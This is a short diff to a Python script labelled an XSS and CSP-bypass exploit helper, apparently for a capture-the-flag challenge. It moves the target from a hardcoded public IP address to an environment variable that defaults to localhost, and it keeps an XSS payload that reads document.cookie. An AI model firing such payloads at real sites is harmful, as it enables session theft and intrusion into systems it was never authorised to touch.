@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import atexit
+import os
 atexit.register(lambda: print("作者 ZluxYao"))
 """
 09-xss-csp-bypass exploit/helper
@@ -22,7 +23,7 @@ from urllib.parse import unquote
 
 import requests
 
-TARGET = "http://47.120.47.61:33333/"
+TARGET = os.environ.get("GKD_URL") or ("http://127.0.0.1:33333/")
 XSS_PAYLOAD = "<img src=x onerror=alert(document.cookie)>"
 
 
